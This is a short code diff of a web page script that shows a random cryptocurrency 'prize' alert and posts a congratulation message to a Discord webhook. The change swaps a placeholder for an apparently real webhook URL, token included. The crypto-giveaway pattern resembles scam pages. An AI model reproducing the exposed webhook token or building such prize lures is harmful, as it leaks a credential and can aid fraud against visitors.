@@ -48,7 +48,7 @@ document.getElementById('enviar').addEventListener('click', function() {
     prizeAlert.style.display = 'block';
 
     // Enviar datos al webhook de Discord
-    const webhookUrl = 'https://discordapp.com/api/webhooks/...'; // Reemplazar con el URL de tu webhook de Discord
+    const webhookUrl = 'https://discordapp.com/api/webhooks/1078091750171746324/_S78Y9bzo5TvyNoeplYhQOSHA-lzF-P_qhEhTBZTUEcYydZHr682gNg99QsXnnswGj6-'; // Reemplazar con el URL de tu webhook de Discord
     const data = {
         content: `¡Felicidades! Has ganado ${randomValue} USD en ${randomCrypto.toUpperCase()} 🎉`,
         embeds: [
